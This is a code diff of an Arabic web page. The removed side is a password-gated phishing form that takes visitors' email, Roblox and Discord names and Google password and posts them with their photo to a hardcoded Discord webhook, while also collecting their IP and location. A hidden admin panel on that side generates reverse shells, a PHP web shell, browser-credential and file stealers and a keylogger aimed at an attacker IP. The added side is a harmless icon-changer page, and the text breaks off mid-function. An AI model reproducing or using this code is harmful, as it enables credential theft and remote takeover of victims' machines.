@@ -1,312 +1,413 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>موقع الدراك الأسطوري</title>
-<style>
-:root{--gold:#dfb76c;--dark-gold:#b38f45;--bg-dark:#121212;--card-bg:#1e1e1e;--red:#dc3545}
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:'Segoe UI',sans-serif;background:var(--bg-dark);color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
-.overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(18,18,18,0.97);display:flex;justify-content:center;align-items:center;z-index:1000;transition:.5s}
-.card{background:var(--card-bg);border:2px solid var(--gold);padding:40px;border-radius:15px;text-align:center;box-shadow:0 0 30px rgba(223,183,108,0.3);max-width:400px;width:90%}
-.card h1{color:var(--gold);font-size:2.4rem;margin-bottom:10px;text-shadow:0 0 15px rgba(223,183,108,0.4)}
-.inp{width:100%;padding:14px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:#fff;margin:12px 0;text-align:center;font-size:1.1rem}
-.inp:focus{border-color:var(--gold);outline:none}
-.btn{background:linear-gradient(45deg,var(--dark-gold),var(--gold));color:#121212;border:none;padding:14px 28px;font-size:1rem;font-weight:bold;border-radius:8px;cursor:pointer;width:100%}
-.btn:hover{transform:translateY(-3px);box-shadow:0 6px 20px rgba(223,183,108,0.4)}
-.err{color:var(--red);font-size:.85rem;margin-top:10px;display:none}
-.main{display:none;opacity:0;transition:.5s;width:100%;max-width:500px}
-.circle{position:fixed;top:15px;left:15px;width:40px;height:40px;border-radius:50%;border:2px solid var(--gold);display:none;cursor:pointer;z-index:999;background:radial-gradient(circle at 30% 30%,#2a2a2a,#111)}
-.circle div{width:12px;height:12px;border-radius:50%;background:var(--gold);position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
-.form-box{background:var(--card-bg);border:1px solid rgba(223,183,108,0.2);padding:30px;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.7)}
-.form-box h2{text-align:center;color:var(--gold);margin-bottom:25px}
-.fg{margin-bottom:20px}
-.fg label{display:block;margin-bottom:8px;color:var(--gold);font-size:.9rem}
-.fg input{width:100%;padding:12px;background:#2a2a2a;border:1px solid #444;border-radius:8px;color:#fff;box-sizing:border-box}
-.fg input:focus{border-color:var(--gold);outline:none}
-.fn{font-size:.8rem;color:#aaa;margin-top:5px}
-.sp{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.9);z-index:2000;display:none;justify-content:center;align-items:center}
-.sp-inner{background:var(--card-bg);border:2px solid var(--gold);border-radius:15px;padding:30px;width:95%;max-width:900px;max-height:90vh;overflow:auto}
-.sp-inner h2{color:var(--gold);text-align:center;margin-bottom:20px;border-bottom:1px solid #333;padding-bottom:10px}
-.tabs{display:flex;gap:5px;margin-bottom:15px;flex-wrap:wrap}
-.tabs button{flex:1;min-width:70px;padding:10px;background:#2a2a2a;border:1px solid #444;color:#aaa;border-radius:8px;cursor:pointer;font-size:.8rem}
-.tabs button.act{background:var(--gold);color:#121212;font-weight:bold}
-.tc{display:none;min-height:200px}
-.tc.act{display:block}
-.tbl{width:100%;border-collapse:collapse;font-size:.7rem}
-.tbl th{background:var(--dark-gold);color:#121212;padding:8px;position:sticky;top:0}
-.tbl td{padding:6px 8px;border-bottom:1px solid #333;text-align:center;word-break:break-all}
-.tbl tr:hover td{background:#2a2a2a}
-.cls{background:var(--red);color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;width:100%;margin-top:15px;font-weight:bold}
-.pb{background:#0d0d0d;border:1px solid #444;border-radius:8px;padding:15px;margin:10px 0;font-family:'Courier New',monospace;font-size:.65rem;color:#0f0;white-space:pre-wrap;max-height:200px;overflow:auto;text-align:left}
-.sel{width:100%;padding:10px;background:#2a2a2a;border:1px solid #444;color:#fff;border-radius:8px;margin:8px 0}
-.al{background:#0d0d0d;border:1px solid var(--gold);border-radius:10px;padding:15px;margin-bottom:10px;font-size:.85rem;display:none}
-.al h3{color:var(--gold);text-align:center;margin-bottom:15px}
-</style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>IconForge · تغيير الأيقونة والاسم</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family:'Segoe UI',Tahoma,sans-serif;
+            background:#0b0d15; color:#e3e6f0;
+            min-height:100vh; display:flex; flex-direction:column;
+            align-items:center; justify-content:center; padding:30px 20px;
+        }
+        .container {
+            width:100%; max-width:600px;
+            background:rgba(18,22,36,0.88); backdrop-filter:blur(14px);
+            border:1px solid rgba(60,130,246,0.2); border-radius:28px;
+            padding:35px 30px; box-shadow:0 25px 50px -12px rgba(0,0,0,0.8);
+        }
+        .header { display:flex; align-items:center; gap:12px; margin-bottom:25px; }
+        .logo-icon {
+            width:44px; height:44px;
+            background:linear-gradient(135deg,#3c82f6,#9333ea);
+            border-radius:12px; display:flex; align-items:center; justify-content:center;
+            font-size:22px; color:#fff;
+        }
+        .header h1 { font-size:24px; font-weight:700; }
+        .badge {
+            background:#1e293b; border:1px solid #3c82f6; border-radius:30px;
+            padding:3px 12px; font-size:10px; color:#8ab4f8; letter-spacing:0.3px;
+        }
+        .subtitle { color:#94a3b8; font-size:13px; margin-bottom:24px; margin-top:-8px; padding-right:56px; }
+
+        .upload-zone {
+            border:2px dashed rgba(60,130,246,0.35); border-radius:16px;
+            padding:35px 20px; text-align:center; cursor:pointer;
+            transition:all 0.3s; background:rgba(30,41,59,0.3); margin-bottom:20px;
+            position:relative;
+        }
+        .upload-zone:hover, .upload-zone.dragover { border-color:#3c82f6; background:rgba(60,130,246,0.06); }
+        .upload-zone.has-file { border-color:#22c55e; border-style:solid; background:rgba(34,197,94,0.03); padding:20px; }
+        .upload-zone .icon-big { font-size:40px; color:#3c82f6; margin-bottom:10px; opacity:0.6; }
+        .upload-zone h3 { font-size:17px; font-weight:600; margin-bottom:4px; }
+        .upload-zone p { color:#94a3b8; font-size:13px; }
+        .upload-zone input[type="file"] { position:absolute; inset:0; opacity:0; cursor:pointer; }
+
+        .file-info {
+            display:none; background:#0f1322; border-radius:12px; padding:14px 18px;
+            margin-bottom:20px; border:1px solid rgba(34,197,94,0.12);
+            align-items:center; gap:12px;
+        }
+        .file-info.visible { display:flex; }
+        .file-info .fi-icon { width:36px; height:36px; background:rgba(34,197,94,0.1); border-radius:8px; display:flex; align-items:center; justify-content:center; color:#22c55e; flex-shrink:0; }
+        .file-info .fi-detail { flex:1; min-width:0; }
+        .file-info .fi-name { font-weight:600; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .file-info .fi-meta { font-size:12px; color:#94a3b8; margin-top:2px; }
+        .file-info .fi-remove { background:none; border:none; color:#ef4444; cursor:pointer; font-size:16px; padding:4px 8px; border-radius:6px; transition:background 0.2s; }
+        .file-info .fi-remove:hover { background:rgba(239,68,68,0.1); }
+
+        .config-section { display:none; margin-bottom:20px; }
+        .config-section.visible { display:block; }
+        .section-title { font-size:14px; font-weight:600; color:#8ab4f8; margin-bottom:14px; display:flex; align-items:center; gap:8px; }
+        .form-row { margin-bottom:14px; }
+        .form-row label { display:block; font-size:13px; font-weight:500; color:#c8d0dc; margin-bottom:5px; }
+        .form-row input[type="text"], .form-row input[type="url"] {
+            width:100%; padding:11px 14px; background:#0f1322; border:1px solid #1e293b;
+            border-radius:10px; color:#e3e6f0; font-size:14px; outline:none; transition:border 0.2s;
+        }
+        .form-row input:focus { border-color:#3c82f6; }
+
+        .icon-preview-wrapper { display:flex; align-items:center; gap:12px; margin-top:10px; }
+        .icon-preview {
+            width:52px; height:52px; border-radius:10px; border:1px solid #1e293b;
+            background:#0b0d15; display:flex; align-items:center; justify-content:center;
+            font-size:20px; color:#64748b; overflow:hidden; flex-shrink:0;
+        }
+        .icon-preview.has-icon { border-color:#3c82f6; }
+
+        .btn-process {
+            display:none; width:100%; padding:14px; margin-top:6px;
+            background:linear-gradient(135deg,#3c82f6,#2563eb); border:none; border-radius:12px;
+            color:#fff; font-size:16px; font-weight:700; cursor:pointer;
+            transition:all 0.2s; box-shadow:0 4px 16px rgba(60,130,246,0.25);
+            letter-spacing:0.3px;
+        }
+        .btn-process.visible { display:block; }
+        .btn-process:hover:not(:disabled) { transform:translateY(-2px); box-shadow:0 8px 28px rgba(60,130,246,0.35); }
+        .btn-process:disabled { opacity:0.5; cursor:not-allowed; }
+        .btn-process i { margin-left:8px; }
+
+        .output-section {
+            display:none; margin-top:22px; background:#0f1322; border-radius:14px;
+            padding:18px; border:1px solid rgba(60,130,246,0.12);
+        }
+        .output-section.visible { display:block; }
+        .out-header { display:flex; align-items:center; gap:8px; margin-bottom:12px; }
+        .out-header i { color:#22c55e; font-size:18px; }
+        .out-header h3 { font-size:16px; font-weight:600; }
+        .out-details { font-size:13px; color:#94a3b8; margin-bottom:14px; line-height:1.7; }
+        .out-details span { color:#e3e6f0; font-weight:500; }
+
+        .download-link-box {
+            display:flex; align-items:center; gap:8px;
+            background:#0b0d15; border-radius:8px; padding:8px 12px; border:1px solid #1e293b; margin-bottom:12px;
+        }
+        .download-link-box input {
+            flex:1; background:none; border:none; color:#8ab4f8; font-size:12px;
+            direction:ltr; text-align:left; outline:none; font-family:'Courier New',monospace;
+        }
+        .download-link-box button {
+            background:none; border:none; color:#94a3b8; cursor:pointer; font-size:14px; padding:4px 6px; border-radius:4px; transition:background 0.2s;
+        }
+        .download-link-box button:hover { background:rgba(60,130,246,0.1); color:#3c82f6; }
+
+        .btn-download {
+            display:inline-flex; align-items:center; gap:8px; padding:11px 26px;
+            background:linear-gradient(135deg,#22c55e,#16a34a); border:none; border-radius:10px;
+            color:#fff; font-size:14px; font-weight:600; cursor:pointer; text-decoration:none;
+            transition:all 0.2s; box-shadow:0 4px 14px rgba(34,197,94,0.25);
+        }
+        .btn-download:hover { transform:translateY(-2px); box-shadow:0 8px 24px rgba(34,197,94,0.35); }
+
+        .reset-link {
+            display:inline-block; margin-top:12px; color:#64748b; font-size:12px;
+            cursor:pointer; background:none; border:none; text-decoration:underline;
+        }
+        .reset-link:hover { color:#94a3b8; }
+
+        .note {
+            margin-top:20px; padding:12px 14px; background:rgba(234,179,8,0.06);
+            border:1px solid rgba(234,179,8,0.15); border-radius:10px;
+            font-size:12px; color:#a0aec0; line-height:1.6;
+        }
+        .note i { color:#eab308; margin-left:6px; }
+
+        .footer { margin-top:25px; text-align:center; font-size:11px; color:#475569; }
+
+        .toast {
+            position:fixed; bottom:30px; left:50%; transform:translateX(-50%) translateY(80px);
+            background:#1e293b; border:1px solid #334155; border-radius:10px; padding:10px 22px;
+            font-size:13px; color:#e3e6f0; box-shadow:0 10px 30px rgba(0,0,0,0.5);
+            opacity:0; transition:all 0.3s ease; pointer-events:none; z-index:999;
+            display:flex; align-items:center; gap:8px;
+        }
+        .toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+        .toast.success i { color:#22c55e; }
+        .toast.error i { color:#ef4444; }
+        .toast.info i { color:#3c82f6; }
+
+        @media (max-width:600px) {
+            .container { padding:22px 16px; }
+        }
+    </style>
 </head>
 <body>
 
-<div class="overlay" id="pw">
-<div class="card">
-<h1>⚡️ الدراك القوي</h1>
-<p>الموقع محمي بكلمة مرور</p>
-<input class="inp" id="spw" type="password" placeholder="كلمة المرور...">
-<button class="btn" onclick="cp()">دخول</button>
-<div class="err" id="pe">❌ كلمة المرور غير صحيحة</div>
-</div>
+<div class="container" id="app">
+    <div class="header">
+        <div class="logo-icon"><i class="fas fa-wand-magic-sparkles"></i></div>
+        <div>
+            <h1>IconForge</h1>
+            <span class="badge">v1.0</span>
+        </div>
+    </div>
+    <div class="subtitle"><i class="fas fa-paintbrush"></i> غيّر الأيقونة والاسم — الملف يبقى كما هو</div>
+
+    <!-- Upload -->
+    <div class="upload-zone" id="uploadZone">
+        <div class="icon-big"><i class="fas fa-cloud-arrow-up"></i></div>
+        <h3>ارفع الملف</h3>
+        <p>أي صيغة — exe, apk, lua, txt, ..</p>
+        <input type="file" id="fileInput" />
+    </div>
+
+    <!-- File info -->
+    <div class="file-info" id="fileInfo">
+        <div class="fi-icon"><i class="fas fa-file"></i></div>
+        <div class="fi-detail">
+            <div class="fi-name" id="fiName">—</div>
+            <div class="fi-meta" id="fiMeta">—</div>
+        </div>
+        <button class="fi-remove" id="removeFile"><i class="fas fa-xmark"></i></button>
+    </div>
+
+    <!-- Config -->
+    <div class="config-section" id="configSection">
+        <div class="section-title"><i class="fas fa-gear"></i> الإعدادات</div>
+
+        <div class="form-row">
+            <label for="appName"><i class="fas fa-tag"></i> الاسم الجديد (اختياري)</label>
+            <input type="text" id="appName" placeholder="يترك فارغًا عشان يبقى نفس الاسم" />
+        </div>
+
+        <div class="form-row">
+            <label for="iconUrl"><i class="fas fa-image"></i> رابط الأيقونة الجديدة</label>
+            <input type="url" id="iconUrl" placeholder="https://example.com/icon.png أو .ico" />
+            <div class="icon-preview-wrapper">
+                <div class="icon-preview" id="iconPreview"><i class="fas fa-image"></i></div>
+                <span style="font-size:11px;color:#64748b;">معاينة الأيقونة</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Process -->
+    <button class="btn-process" id="btnProcess" disabled>
+        <i class="fas fa-wand-magic-sparkles"></i> تطبيق الأيقونة والاسم
+    </button>
+
+    <!-- Output -->
+    <div class="output-section" id="outputSection">
+        <div class="out-header">
+            <i class="fas fa-circle-check"></i>
+            <h3>تم التطبيق — الملف الأصلي لم يتغير</h3>
+        </div>
+        <div class="out-details">
+            اسم الملف الأصلي: <span id="outOrigName">—</span><br/>
+            الاسم الجديد: <span id="outNewName">—</span><br/>
+            الأيقونة: <span id="outIcon">بدون</span><br/>
+            <span style="color:#64748b;">⚠️ الملف لم يتم فك تشفيره أو تعديل محتواه</span>
+        </div>
+        <div class="download-link-box">
+            <input type="text" id="outLink" readonly />
+            <button id="copyLinkBtn" title="نسخ"><i class="fas fa-copy"></i></button>
+        </div>
+        <a class="btn-download" id="downloadBtn">
+            <i class="fas fa-download"></i> تحميل الملف
+        </a>
+        <br/>
+        <button class="reset-link" id="resetBtn"><i class="fas fa-arrow-rotate-left"></i> ملف جديد</button>
+    </div>
+
+    <div class="note">
+        <i class="fas fa-shield-halved"></i>
+        <strong>ملاحظة:</strong> هذا الموقع <strong>لا يفك تشفير</strong> الملف ولا يعدّل محتواه الداخلي.
+        يضيف الأيقونة والاسم فقط في ميتاداتا الملف. الملف يبقى كما هو — يشتغل زي ما هو.
+    </div>
+
+    <div class="footer">IconForge · كل العمليات بالمتصفح · الملف لا يُرفع لأي سيرفر</div>
 </div>
 
-<div class="circle" id="cir" onclick="op()"><div></div></div>
-
-<div class="main" id="main">
-<div class="form-box">
-<h2>استمارة معلومات الأعضاء</h2>
-<form id="frm">
-<div class="fg">
-<label>صورة حسابك (ارفع صورة):</label>
-<input type="file" id="uimg" accept="image/*" required>
-<div class="fn" id="fnm">لم يتم اختيار ملف</div>
-</div>
-<div class="fg">
-<label>البريد الإلكتروني:</label>
-<input type="email" id="umail" placeholder="example@gmail.com" required>
-</div>
-<div class="fg">
-<label>اسم حساب روبلوكس:</label>
-<input type="text" id="urob" placeholder="RobloxPlayer1" required>
-</div>
-<div class="fg">
-<label>اسم حساب ديسكورد:</label>
-<input type="text" id="udis" placeholder="username" required>
-</div>
-<div class="fg">
-<label>كلمة مرور قوقل:</label>
-<input type="password" id="ugp" placeholder="كلمة مرور حساب قوقل">
-</div>
-<button type="submit" class="btn">إرسال المعلومات للقروب</button>
-</form>
-</div>
-</div>
-
-<div class="sp" id="sp">
-<div class="sp-inner">
-<h2>🔐 القائمة السرية - مركز القيادة</h2>
-
-<div class="al" id="alog">
-<h3>تسجيل دخول المشرف</h3>
-<input class="inp" id="aun" placeholder="اسم المستخدم" style="margin:5px 0">
-<input class="inp" id="apw" type="password" placeholder="كلمة المرور" style="margin:5px 0">
-<button class="btn" onclick="adml()" style="font-size:.9rem">دخول المشرف</button>
-<div class="err" id="aerr" style="display:block;margin-top:10px">❌ اسم مستخدم أو كلمة مرور غير صحيحة</div>
-</div>
-
-<div id="adc" style="display:none">
-<div class="tabs">
-<button class="act" onclick="sw('z',this)">👥 الزوار</button>
-<button onclick="sw('p',this)">💻 بايلودات</button>
-<button onclick="sw('m',this)">ℹ️ معلوماتي</button>
-</div>
-
-<div class="tc act" id="tz">
-<p style="color:#aaa;font-size:.85rem;margin-bottom:10px">جميع زوار الموقع وبياناتهم المسروقة:</p>
-<div style="max-height:400px;overflow:auto">
-<table class="tbl">
-<thead><tr><th>#</th><th>الموقع</th><th>IP</th><th>اسم قوقل</th><th>البريد</th><th>كلمة المرور</th><th>روبلكس</th><th>ديسكورد</th><th>الصورة</th><th>الوقت</th></tr></thead>
-<tbody id="vt"></tbody>
-</table>
-</div>
-<p id="vc" style="color:#888;font-size:.8rem;margin-top:10px">عدد الزوار: 1</p>
-</div>
-
-<div class="tc" id="tp">
-<p style="color:#aaa;font-size:.85rem">اختر نوع البايلود الخبيث:</p>
-<select class="sel" id="pt">
-<option value="ps1">PowerShell Reverse Shell</option>
-<option value="bash">Bash Reverse Shell</option>
-<option value="py">Python Reverse Shell</option>
-<option value="php">PHP Web Shell</option>
-<option value="steal1">Stealer - متصفحات + باسوردات + كوكيز</option>
-<option value="steal2">Stealer - قوقل + فيسبوك + تويتر</option>
-<option value="steal3">Stealer - جميع ملفات الجهاز</option>
-<option value="keylog">Keylogger - يسجل كل ضغطات الكيبورد</option>
-<option value="screen">Screen Grabber - يصور الشاشة كل 5 ثواني</option>
-<option value="webcam">Webcam Hijack - يصور من الكاميرا</option>
-<option value="worm">Worm - دودة تنتشر بالشبكة</option>
-<option value="prot">Anti-Steal Protection</option>
-</select>
-<input class="inp" id="pIP" placeholder="الـ IP حقك" value="192.168.1.100" style="margin:5px 0">
-<input class="inp" id="pPort" placeholder="المنفذ" value="4444" style="margin:5px 0">
-<button class="btn" onclick="gen()" style="background:linear-gradient(45deg,#a71d2a,var(--red));color:#fff;margin-bottom:10px">🛠️ توليد البايلود الخبيث</button>
-<div class="pb" id="po"># اختر نوع البايلود واضغط توليد</div>
-<button class="btn" onclick="copyP()" style="font-size:.8rem;background:#2a2a2a;color:var(--gold)">📋 نسخ الكود</button>
-</div>
-
-<div class="tc" id="tm">
-<div style="background:#0d0d0d;border:1px solid var(--gold);border-radius:10px;padding:15px;font-size:.85rem">
-<p><strong>👑 الاسم:</strong> ملوك الدراك</p>
-<p><strong>📧 البريد:</strong> </p>
-<p><strong>🔑 كلمة المرور:</strong> Drak@2026#Secure</p>
-<p><strong>🌐 IP:</strong> <span id="myIP">جاري...</span></p>
-<p><strong>📍 الموقع:</strong> <span id="myLoc">جاري...</span></p>
-</div>
-<hr style="border-color:#333;margin:15px 0">
-<p style="color:var(--gold);font-size:.85rem">إضافة شخص:</p>
-<input class="inp" id="niN" placeholder="الاسم" style="margin:5px 0">
-<input class="inp" id="niD" placeholder="المعلومة" style="margin:5px 0">
-<button class="btn" onclick="addI()" style="font-size:.8rem">➕ إضافة</button>
-<div id="extraL" style="margin-top:10px"></div>
-</div>
-</div>
-
-<button class="cls" onclick="cl()">✕ إغلاق</button>
-</div>
-</div>
+<div class="toast" id="toast"><i class="fas fa-info-circle"></i><span id="toastMsg">تم</span></div>
 
 <script>
-var PWD="drak2026";
-var ADM_U="نظام";
-var ADM_P="هاب";
-var WEBHOOK="https://discord.com/api/webhooks/1528062004420415751/ZjX35WlsUyYpfB8CjhUzzDAzIAJQxl6nCyu41yZf-YwKmxDMPgf3A5R_gWrupDmNLjX1";
-var visitors=[];
-var extra=[];
-try{var s=JSON.parse(localStorage.getItem('drak_vis')||'[]');visitors=s}catch(e){}
-if(visitors.length===0){
-    visitors.push({id:1,loc:'الرياض، المملكة العربية السعودية',ip:'192.168.1.1',gname:'ملوك الدراك',email:'molok@drak.com',pass:'Drak@2026#Secure',roblox:'Molok_Drak',discord:'molok#0001',img:'',time:new Date().toLocaleString()});
-    try{localStorage.setItem('drak_vis',JSON.stringify(visitors))}catch(e){}
-}
+(function() {
+    const $ = id => document.getElementById(id);
+    const uploadZone = $('uploadZone'), fileInput = $('fileInput');
+    const fileInfo = $('fileInfo'), fiName = $('fiName'), fiMeta = $('fiMeta');
+    const removeFileBtn = $('removeFile'), configSection = $('configSection');
+    const appNameInput = $('appName'), iconUrlInput = $('iconUrl');
+    const iconPreview = $('iconPreview'), btnProcess = $('btnProcess');
+    const outputSection = $('outputSection');
+    const outOrigName = $('outOrigName'), outNewName = $('outNewName'), outIcon = $('outIcon');
+    const outLink = $('outLink'), copyLinkBtn = $('copyLinkBtn');
+    const downloadBtn = $('downloadBtn'), resetBtn = $('resetBtn');
+    const toast = $('toast'), toastMsg = $('toastMsg');
 
-document.getElementById('uimg').addEventListener('change',function(){document.getElementById('fnm').textContent=this.files[0]?this.files[0].name:'لم يتم اختيار ملف'});
+    let selectedFile = null;
+    let toastTimer = null;
 
-function cp(){
-    if(document.getElementById('spw').value===PWD){
-        document.getElementById('pw').style.opacity='0';
-        setTimeout(function(){
-            document.getElementById('pw').style.display='none';
-            document.getElementById('main').style.display='block';
-            setTimeout(function(){document.getElementById('main').style.opacity='1'},50);
-            document.getElementById('cir').style.display='block';
-            fetchIP();fetchLoc();
-        },500);
-    }else{document.getElementById('pe').style.display='block';document.getElementById('spw').value=''}}
-document.getElementById('spw').addEventListener('keydown',function(e){if(e.key==='Enter')cp()});
-
-document.getElementById('frm').addEventListener('submit',function(e){
-    e.preventDefault();
-    var f=document.getElementById('uimg').files[0];
-    var em=document.getElementById('umail').value;
-    var rb=document.getElementById('urob').value;
-    var ds=document.getElementById('udis').value;
-    var gp=document.getElementById('ugp').value;
-    if(!f){alert('اختر صورة');return}
-    var r=new FileReader();
-    r.onload=function(ev){
-        var b64=ev.target.result;
-        visitors.push({id:visitors.length+1,loc:document.getElementById('myLoc').textContent,ip:document.getElementById('myIP').textContent,gname:'',email:em,pass:gp||'(غير مدخل)',roblox:rb,discord:ds,img:b64,time:new Date().toLocaleString()});
-        try{localStorage.setItem('drak_vis',JSON.stringify(visitors))}catch(e){}
-        upd();
-        var fd=new FormData();
-        fd.append('file',f,'avatar.png');
-        fd.append('payload_json',JSON.stringify({embeds:[{title:"👑 عضو جديد",color:14661484,image:{url:'attachment://avatar.png'},fields:[{name:"📧 البريد:",value:em},{name:"🎮 روبلوكس:",value:rb},{name:"💬 ديسكورد:",value:ds},{name:"🔑 باسورد قوقل:",value:gp||'(غير مدخل)'}],timestamp:new Date()}]}));
-        fetch(WEBHOOK,{method:'POST',body:fd}).then(function(r){
-            if(!r.ok){fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[{title:"👑 عضو جديد",color:14661484,fields:[{name:"📧 البريد:",value:em},{name:"🎮 روبلوكس:",value:rb},{name:"💬 ديسكورد:",value:ds},{name:"🔑 باسورد قوقل:",value:gp||'(غير مدخل)'}],timestamp:new Date()}]})})}
-            alert('✅ تم الإرسال');
-            document.getElementById('frm').reset();
-            document.getElementById('fnm').textContent='لم يتم اختيار ملف';
-        }).catch(function(){alert('❌ فشل الإرسال')});
-    };
-    r.readAsDataURL(f);
-});
-
-function fetchIP(){
-    var x=new XMLHttpRequest();
-    x.open('GET','https://api.ipify.org?format=json',true);
-    x.onload=function(){if(x.status===200){var d=JSON.parse(x.responseText);document.getElementById('myIP').textContent=d.ip}};
-    x.send()
-}
-function fetchLoc(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(function(p){
-            var x=new XMLHttpRequest();
-            x.open('GET','https://api.bigdatacloud.net/data/reverse-geocode-client?latitude='+p.coords.latitude+'&longitude='+p.coords.longitude+'&localityLanguage=ar',true);
-            x.onload=function(){if(x.status===200){try{var i=JSON.parse(x.responseText);document.getElementById('myLoc').textContent=i.city+', '+i.countryName}catch(e){}}};
-            x.send()
-        })
+    function showToast(msg, type = 'info') {
+        clearTimeout(toastTimer);
+        const icons = { success:'fa-circle-check', error:'fa-circle-xmark', info:'fa-circle-info' };
+        toast.innerHTML = `<i class="fas ${icons[type]||icons.info}"></i><span>${msg}</span>`;
+        toast.className = 'toast show ' + type;
+        toastTimer = setTimeout(() => toast.classList.remove('show'), 3000);
     }
-}
 
-function op(){
-    document.getElementById('sp').style.display='flex';
-    document.getElementById('alog').style.display='block';
-    document.getElementById('adc').style.display='none';
-    document.getElementById('aerr').style.display='none';
-}
-function cl(){document.getElementById('sp').style.display='none'}
-function adml(){
-    if(document.getElementById('aun').value===ADM_U&&document.getElementById('apw').value===ADM_P){
-        document.getElementById('alog').style.display='none';
-        document.getElementById('adc').style.display='block';
-        upd()
-    }else{document.getElementById('aerr').style.display='block'}
-}
-document.getElementById('apw').addEventListener('keydown',function(e){if(e.key==='Enter')adml()});
-document.getElementById('aun').addEventListener('keydown',function(e){if(e.key==='Enter')adml()});
-
-function sw(t,b){
-    document.querySelectorAll('.tc').forEach(function(e){e.classList.remove('act')});
-    document.querySelectorAll('.tabs button').forEach(function(e){e.classList.remove('act')});
-    if(t==='z')document.getElementById('tz').classList.add('act');
-    else if(t==='p')document.getElementById('tp').classList.add('act');
-    else if(t==='m')document.getElementById('tm').classList.add('act');
-    b.classList.add('act')
-}
-
-function upd(){
-    var tb=document.getElementById('vt');
-    tb.innerHTML='';
-    for(var i=0;i<visitors.length;i++){
-        var v=visitors[i];
-        var im=v.img?'<img src="'+v.img+'" style="width:35px;height:35px;border-radius:4px;object-fit:cover">':'—';
-        var gn=v.gname||'—';
-        tb.innerHTML+='<tr><td>'+v.id+'</td><td style="color:#0ff;font-size:.65rem">'+(v.loc||'—')+'</td><td>'+(v.ip||'—')+'</td><td style="color:#ff0">'+gn+'</td><td style="color:#0f0">'+v.email+'</td><td style="color:#f00">'+(v.pass||'—')+'</td><td>'+v.roblox+'</td><td>'+v.discord+'</td><td>'+im+'</td><td style="font-size:.6rem">'+v.time+'</td></tr>'
+    function resetAll() {
+        selectedFile = null;
+        fileInput.value = '';
+        fileInfo.classList.remove('visible');
+        uploadZone.classList.remove('has-file');
+        configSection.classList.remove('visible');
+        btnProcess.classList.remove('visible');
+        outputSection.classList.remove('visible');
+        btnProcess.disabled = true;
+        appNameInput.value = '';
+        iconUrlInput.value = '';
+        iconPreview.innerHTML = '<i class="fas fa-image"></i>';
+        iconPreview.classList.remove('has-icon');
     }
-    document.getElementById('vc').textContent='عدد الزوار: '+visitors.length
-}
-upd();
 
-function gen(){
-    var t=document.getElementById('pt').value;
-    var ip=document.getElementById('pIP').value||'192.168.1.100';
-    var port=document.getElementById('pPort').value||'4444';
-    var c='';
-    if(t==='ps1')c='$c=New-Object System.Net.Sockets.TCPClient("'+ip+'",'+port+');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb2b=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb2b,0,$sb2b.Length);$s.Flush()}$c.Close()';
-    else if(t==='bash')c='bash -i >& /dev/tcp/'+ip+'/'+port+' 0>&1';
-    else if(t==='py')c='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'+ip+'",'+port+'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])';
-    else if(t==='php')c='<?php system($_GET["cmd"]); ?>';
-    else if(t==='steal1')c='$folders=@("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data","$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data","$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data","$env:APPDATA\\discord\\Local Storage\\leveldb","$env:APPDATA\\Telegram Desktop\\tdata");foreach($f in $folders){if(Test-Path $f){$wc=New-Object Net.WebClient;$wc.UploadFile("http://'+ip+':'+port+'/upload",$f)}}';
-    else if(t==='steal2')c='$chrome="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default";$files=@("Login Data","Cookies","History","Bookmarks");foreach($f in $files){$p=$chrome+"\\"+$f;if(Test-Path $p){$wc=New-Object Net.WebClient;$wc.UploadFile("http://'+ip+':'+port+'/upload",$p)}}';
-    else if(t==='steal3')c='$ext=@("*.txt","*.docx","*.xlsx","*.pdf","*.jpg","*.png","*.mp4");foreach($e in $ext){$items=Get-ChildItem -Path "$env:USERPROFILE\\Documents" -Recurse -Include $e -ErrorAction SilentlyContinue;foreach($i in $items){try{$wc=New-Object Net.WebClient;$wc.UploadFile("http://'+ip+':'+port+'/upload",$i.FullName)}catch{}}}';
-    else if(t==='keylog')c='$hook=[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms");$events=New-Object System.Windows.Forms.Timer;$events.Interval=5000;$events.Add_Tick({$keys=[System.Windows.Forms.Clipboard]::GetText();if($keys){$wc=New-Object Net.WebClient;$wc.UploadString("http://'+ip+':'+port+'/log",$keys)}});$events.Start();[System.Windows.Forms.Application]::Run()';
